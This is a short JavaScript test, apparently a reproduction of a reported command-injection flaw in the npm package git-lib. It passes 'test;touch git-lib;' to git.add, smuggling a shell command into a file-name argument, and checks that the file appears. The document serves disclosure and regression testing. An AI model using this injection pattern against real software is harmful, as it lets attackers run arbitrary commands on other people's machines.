//https://hackerone.com/reports/718241
test("Remote code execution in git-lib", () => {
  const git = require("git-lib");
  const fs = require("fs");
  const path = "./git-lib";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    git.add("test;touch git-lib;").then(function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (error) {}
});
